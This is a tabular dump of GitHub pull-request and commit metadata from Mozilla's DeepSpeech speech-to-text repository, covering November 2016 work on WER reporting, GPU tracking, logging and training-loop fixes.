4257,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ed32995f7490c935e13df50fa594b3576bdf8e5,"Forcing python to not buffer output

Fixes #198"
4258,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,229ef36fcce55a8cd5fae3ad34c15c9a154b6ccd,Fix #202; Moving accuracy calculation to display steps
4259,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89176755e858def0c5c05bd93cd184bac2329690,"Tracking GPU Usage

Fixes #178"
4260,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,195b9c49d134afc43b73afba80df23a1dacdf9bf,Correct calculations for when we display/validate/checkpoint
4261,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a298e97b884685064472dcdc110c6932edab885b,Fixed #201
4262,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ccab0622433fbf1235260318471c7676de63f22d,64 leads to OOM
4263,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,69a8fdb4303c6766d74c5aa7021e35272e220dd2,Updated params inline with IRC discussion
4264,https://api.github.com/repos/mozilla/DeepSpeech/pulls/214,214,Wer update,,lissyx,1645737,2016-11-17T20:38:32Z,COLLABORATOR,True,26,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1766ba808b23158550a3fb27a4e9fad9b1e0a99a,Fixed #201
4265,https://api.github.com/repos/mozilla/DeepSpeech/pulls/214,214,Wer update,,lissyx,1645737,2016-11-17T20:38:32Z,COLLABORATOR,True,26,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27f2c5f90fee389364477edcdf6896d3e0335a0b,64 leads to OOM
4266,https://api.github.com/repos/mozilla/DeepSpeech/pulls/214,214,Wer update,,lissyx,1645737,2016-11-17T20:38:32Z,COLLABORATOR,True,26,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a49a2e52ead699156b9b8ca6bca8d624bbc1c41c,Correct calculations for when we display/validate/checkpoint
4267,https://api.github.com/repos/mozilla/DeepSpeech/pulls/214,214,Wer update,,lissyx,1645737,2016-11-17T20:38:32Z,COLLABORATOR,True,26,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ee5225baacee5bda6f448111a97d6441618aced,"Merge pull request #212 from Cwiiis/correct-step-calculations

Correct calculations for when we display/validate/checkpoint, fixes #210, #209"
4268,https://api.github.com/repos/mozilla/DeepSpeech/pulls/214,214,Wer update,,lissyx,1645737,2016-11-17T20:38:32Z,COLLABORATOR,True,26,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1da578f04c1e8cf8f9ac437ca575f7f9215a6353,Updated params inline with IRC discussion
4269,https://api.github.com/repos/mozilla/DeepSpeech/pulls/214,214,Wer update,,lissyx,1645737,2016-11-17T20:38:32Z,COLLABORATOR,True,26,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4454336d500a15bd5f5e1f7135b8224fabd3084f,"Merge pull request #213 from mozilla/issue201

Issue201"
4270,https://api.github.com/repos/mozilla/DeepSpeech/pulls/214,214,Wer update,,lissyx,1645737,2016-11-17T20:38:32Z,COLLABORATOR,True,26,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ffa079525ddf4c842737f18b96d6feb7b5448d7,Merge remote-tracking branch 'upstream/master' into wer-update
4271,https://api.github.com/repos/mozilla/DeepSpeech/pulls/213,213,Issue201,Changed params in prep for a wer-tracking run,kdavis-mozilla,12054740,2016-11-17T17:11:16Z,CONTRIBUTOR,True,14,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1766ba808b23158550a3fb27a4e9fad9b1e0a99a,Fixed #201
4272,https://api.github.com/repos/mozilla/DeepSpeech/pulls/213,213,Issue201,Changed params in prep for a wer-tracking run,kdavis-mozilla,12054740,2016-11-17T17:11:16Z,CONTRIBUTOR,True,14,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27f2c5f90fee389364477edcdf6896d3e0335a0b,64 leads to OOM
4273,https://api.github.com/repos/mozilla/DeepSpeech/pulls/213,213,Issue201,Changed params in prep for a wer-tracking run,kdavis-mozilla,12054740,2016-11-17T17:11:16Z,CONTRIBUTOR,True,14,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1da578f04c1e8cf8f9ac437ca575f7f9215a6353,Updated params inline with IRC discussion
4274,https://api.github.com/repos/mozilla/DeepSpeech/pulls/212,212,"Correct calculations for when we display/validate/checkpoint, fixes #210, #209",,Cwiiis,668518,2016-11-17T16:39:35Z,CONTRIBUTOR,True,12,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a49a2e52ead699156b9b8ca6bca8d624bbc1c41c,Correct calculations for when we display/validate/checkpoint
4275,https://api.github.com/repos/mozilla/DeepSpeech/pulls/211,211,Fix #205; Better epoch console logging,@kdavis-mozilla This will beautify the console logs. Please take a look.,tilmankamp,5991088,2016-11-17T16:28:32Z,CONTRIBUTOR,True,77,12,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd2df3dbcc7d41ea50f152cff381245c5a519320,Fix #205; Better epoch console logging
4276,https://api.github.com/repos/mozilla/DeepSpeech/pulls/211,211,Fix #205; Better epoch console logging,@kdavis-mozilla This will beautify the console logs. Please take a look.,tilmankamp,5991088,2016-11-17T16:28:32Z,CONTRIBUTOR,True,77,12,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e2f5036994d1cdccc746e7bc61da23bcdff8e8b,Updates based on PR comments
4277,https://api.github.com/repos/mozilla/DeepSpeech/pulls/208,208,Fix #188; Using distances to filter WERs,@kdavis-mozilla This is the slightly optimized WER calculation using ```distance=0``` as ```WER=0``` exclusion criteria. Please take a look.,tilmankamp,5991088,2016-11-17T13:49:19Z,CONTRIBUTOR,True,71,90,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,551a4b116ec23daa23d8422ff17b13976c3ebe06,Fix #188; Using distances to filter WERs
4278,https://api.github.com/repos/mozilla/DeepSpeech/pulls/208,208,Fix #188; Using distances to filter WERs,@kdavis-mozilla This is the slightly optimized WER calculation using ```distance=0``` as ```WER=0``` exclusion criteria. Please take a look.,tilmankamp,5991088,2016-11-17T13:49:19Z,CONTRIBUTOR,True,71,90,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,621c854a28ce8e30c6a7b2769ffd8eb9036b3697,Fixed some markdown
4279,https://api.github.com/repos/mozilla/DeepSpeech/pulls/208,208,Fix #188; Using distances to filter WERs,@kdavis-mozilla This is the slightly optimized WER calculation using ```distance=0``` as ```WER=0``` exclusion criteria. Please take a look.,tilmankamp,5991088,2016-11-17T13:49:19Z,CONTRIBUTOR,True,71,90,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73948a39020687c1b6d251adb1d9397fcfeefe22,Fixing rebased code
4280,https://api.github.com/repos/mozilla/DeepSpeech/pulls/208,208,Fix #188; Using distances to filter WERs,@kdavis-mozilla This is the slightly optimized WER calculation using ```distance=0``` as ```WER=0``` exclusion criteria. Please take a look.,tilmankamp,5991088,2016-11-17T13:49:19Z,CONTRIBUTOR,True,71,90,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e42c541d784de5cced485626a8c12ccbfcb1c2f9,Removed redundant code
4281,https://api.github.com/repos/mozilla/DeepSpeech/pulls/208,208,Fix #188; Using distances to filter WERs,@kdavis-mozilla This is the slightly optimized WER calculation using ```distance=0``` as ```WER=0``` exclusion criteria. Please take a look.,tilmankamp,5991088,2016-11-17T13:49:19Z,CONTRIBUTOR,True,71,90,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfa2dca70b1cbc3f974f7f9b24ebf64fa6ef68f2,Better markdown based on PR comments
4282,https://api.github.com/repos/mozilla/DeepSpeech/pulls/208,208,Fix #188; Using distances to filter WERs,@kdavis-mozilla This is the slightly optimized WER calculation using ```distance=0``` as ```WER=0``` exclusion criteria. Please take a look.,tilmankamp,5991088,2016-11-17T13:49:19Z,CONTRIBUTOR,True,71,90,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,817e65c173e47815f4b1a4e3c980cf15f51718f7,Fixed some markdown
4283,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f96f50abc1e21494e4c6fba846f4a9f42109003e,Fix #195; Calling SummaryWriter after all graph components got created
4284,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3ab214ebce6be862e72c6233f4a4ee4fcb64473,"Merge pull request #196 from mozilla/issue195

Fix #195; Calling SummaryWriter after all graph components got created"
4285,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bed818a54067ade080a7c10afaf22972b57f463,"Fixed #193

Moved graph creationg to before the lines

    # Start queue runner threads
    tf.train.start_queue_runners(sess=session)

    # Start importer's queue threads
    data_sets.start_queue_threads(session)

so as to not have the queue threads operate on a graph that is being
modified."
4286,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4a4c684083f647513bfd6577cb167910658172f2,"Merge pull request #197 from mozilla/issue193

Fixed #193"
4287,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c18cb25fbc81bcedef69e09c087a4e8237ec525,"Forcing python to not buffer output

Fixes #198"
4288,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,757fc74e1ee5795daee62565d677236d425995ed,"Merge pull request #199 from lissyx/issue198

Forcing python to not buffer output"
4289,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,77100ed1dfdeae4b2de545474f478016b9e8aca7,Don't duplicate graph to do validation
4290,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,55eece6ec0eae18a5254b89675a3fc4660a4096c,Don't duplicate graph to do testing
4291,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08064e71203c259f0f7f26bbd236d8f7fd746ab1,"Merge pull request #192 from Cwiiis/validation-graph-duplication-rebased

Don't duplicate graph to do validation and testing, fixes #108"
4292,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5647503e896eb277cbd35dd355c8497a8afe0b3a,Fix #202; Moving accuracy calculation to display steps
4293,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,38dc5c446b1de8b9db518c1452b81657708ee58a,"Merge pull request #203 from mozilla/issue187

Fix #202; Moving accuracy calculation to display steps"
4294,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,58f0609afa9b6d86e51f35242f1a81e46542ee5f,"Tracking GPU Usage

Fixes #178"
4295,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c323e02c8045218ce725da7528877aba72a2036f,"Merge pull request #190 from lissyx/gpu-plot

Tracking GPU Usage"
4296,https://api.github.com/repos/mozilla/DeepSpeech/pulls/206,206,Wer update,,lissyx,1645737,2016-11-17T11:35:37Z,COLLABORATOR,True,356,150,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc1cc94b3019d0926b0b6f2673a5ec8abab86d44,Merge remote-tracking branch 'upstream/master' into wer-update
4297,https://api.github.com/repos/mozilla/DeepSpeech/pulls/203,203,Fix #202; Moving accuracy calculation to display steps,@kdavis-mozilla Please take a look. This should give the display_step increase another boost.,tilmankamp,5991088,2016-11-17T08:00:55Z,CONTRIBUTOR,True,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5647503e896eb277cbd35dd355c8497a8afe0b3a,Fix #202; Moving accuracy calculation to display steps
4298,https://api.github.com/repos/mozilla/DeepSpeech/pulls/199,199,Forcing python to not buffer output,Fixes #198,lissyx,1645737,2016-11-16T12:57:07Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c18cb25fbc81bcedef69e09c087a4e8237ec525,"Forcing python to not buffer output

Fixes #198"
4299,https://api.github.com/repos/mozilla/DeepSpeech/pulls/197,197,Fixed #193,"Moved graph creation to before the lines

    # Start queue runner threads
    tf.train.start_queue_runners(sess=session)

    # Start importer's queue threads
    data_sets.start_queue_threads(session)

so as to not have the queue threads operate on a graph that is being
modified.",kdavis-mozilla,12054740,2016-11-16T12:44:47Z,CONTRIBUTOR,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bed818a54067ade080a7c10afaf22972b57f463,"Fixed #193

Moved graph creationg to before the lines

    # Start queue runner threads
    tf.train.start_queue_runners(sess=session)

    # Start importer's queue threads
    data_sets.start_queue_threads(session)

so as to not have the queue threads operate on a graph that is being
modified."
4300,https://api.github.com/repos/mozilla/DeepSpeech/pulls/196,196,Fix #195; Calling SummaryWriter after all graph components got created,@kdavis-mozilla Please take a look.,tilmankamp,5991088,2016-11-16T09:25:30Z,CONTRIBUTOR,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f96f50abc1e21494e4c6fba846f4a9f42109003e,Fix #195; Calling SummaryWriter after all graph components got created
4301,https://api.github.com/repos/mozilla/DeepSpeech/pulls/194,194,Add workaround for executing session.run() properly,Fixes #193,lissyx,1645737,2016-11-15T16:43:53Z,COLLABORATOR,False,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b82af0d0d213c6be9ef1362394f083f2137b754,"Add workaround for executing session.run() properly

Fixes #193"
4302,https://api.github.com/repos/mozilla/DeepSpeech/pulls/192,192,"Don't duplicate graph to do validation, fixes #108","While I don't think this affects memory use or performance, I do think it improves readability. The resulting graph in tensorboard is no longer duplicated for validation and I think the main loop flow is a little clearer (debatable of course).",Cwiiis,668518,2016-11-15T14:37:25Z,CONTRIBUTOR,True,50,76,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,77100ed1dfdeae4b2de545474f478016b9e8aca7,Don't duplicate graph to do validation
4303,https://api.github.com/repos/mozilla/DeepSpeech/pulls/192,192,"Don't duplicate graph to do validation, fixes #108","While I don't think this affects memory use or performance, I do think it improves readability. The resulting graph in tensorboard is no longer duplicated for validation and I think the main loop flow is a little clearer (debatable of course).",Cwiiis,668518,2016-11-15T14:37:25Z,CONTRIBUTOR,True,50,76,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,55eece6ec0eae18a5254b89675a3fc4660a4096c,Don't duplicate graph to do testing
4304,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a9ed08fc00d6cab3ecfdf35cb0a3330754be50e,Fixed #181 Fixed #182
4305,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,95204878fc1ec73ce79f2d8e1f53360aac330e8b,"Merge pull request #183 from mozilla/issue181+issue182

Fixed #181 Fixed #182"
4306,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d569845f048634a3b7122cb79c2447c1bb7bbdf,Fix #132 #126 - Inlined WER report inference into train loop
4307,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,799390aab3e4c8c2153c217cc4aa6f80cb7ac758,Fix #134; better axis description and value plotting in WER report page
4308,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e358fcdc2753bd273c56cda44a72784d8306e14,Better formatting for Y axis.
4309,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,195700389d3f6126e15d0ab016654bb311fd33dc,"Merge pull request #189 from mozilla/issue134

Fix #134; better axis description and value plotting in WER report page"
4310,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d4beb748b93f2f2e10f0415b913693cdaaa7b1c4,Better code reuse; minor improvements
4311,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61ffce4d86b0e18fd094c47b00220d59952f3f73,Updated some markdown
4312,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d83117147e01fe769be3c515a0060094709e79b,Fixed some markdown
4313,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a60b2913c62fe9fd739c32bdb3ee009cc27b39d,Fixed PR comments
4314,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0cb0540f4aec1d3c7624c7b46bfcb77a81412d8d,"Merge pull request #184 from mozilla/issue132

Fix #132 #126 - Inlined WER report inference into train loop"
4315,https://api.github.com/repos/mozilla/DeepSpeech/pulls/191,191,Wer update,,lissyx,1645737,2016-11-15T13:43:40Z,COLLABORATOR,True,135,122,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd6f7b46497571ec0f311d579c60bab678267751,Merge remote-tracking branch 'upstream/master' into wer-update
4316,https://api.github.com/repos/mozilla/DeepSpeech/pulls/190,190,Tracking GPU Usage,Fixes #178,lissyx,1645737,2016-11-14T16:04:52Z,COLLABORATOR,True,291,59,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,58f0609afa9b6d86e51f35242f1a81e46542ee5f,"Tracking GPU Usage

Fixes #178"
4317,https://api.github.com/repos/mozilla/DeepSpeech/pulls/189,189,Fix #134; better axis description and value plotting in WER report page,@lissyx : Please review.,tilmankamp,5991088,2016-11-14T10:56:43Z,CONTRIBUTOR,True,16,8,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,799390aab3e4c8c2153c217cc4aa6f80cb7ac758,Fix #134; better axis description and value plotting in WER report page
4318,https://api.github.com/repos/mozilla/DeepSpeech/pulls/189,189,Fix #134; better axis description and value plotting in WER report page,@lissyx : Please review.,tilmankamp,5991088,2016-11-14T10:56:43Z,CONTRIBUTOR,True,16,8,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e358fcdc2753bd273c56cda44a72784d8306e14,Better formatting for Y axis.
4319,https://api.github.com/repos/mozilla/DeepSpeech/pulls/184,184,Fix #132 #126 - Inlined WER report inference into train loop,@kdavis-mozilla Could you take a look?,tilmankamp,5991088,2016-11-11T12:59:33Z,CONTRIBUTOR,True,117,112,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d569845f048634a3b7122cb79c2447c1bb7bbdf,Fix #132 #126 - Inlined WER report inference into train loop
4320,https://api.github.com/repos/mozilla/DeepSpeech/pulls/184,184,Fix #132 #126 - Inlined WER report inference into train loop,@kdavis-mozilla Could you take a look?,tilmankamp,5991088,2016-11-11T12:59:33Z,CONTRIBUTOR,True,117,112,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d4beb748b93f2f2e10f0415b913693cdaaa7b1c4,Better code reuse; minor improvements
4321,https://api.github.com/repos/mozilla/DeepSpeech/pulls/184,184,Fix #132 #126 - Inlined WER report inference into train loop,@kdavis-mozilla Could you take a look?,tilmankamp,5991088,2016-11-11T12:59:33Z,CONTRIBUTOR,True,117,112,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61ffce4d86b0e18fd094c47b00220d59952f3f73,Updated some markdown
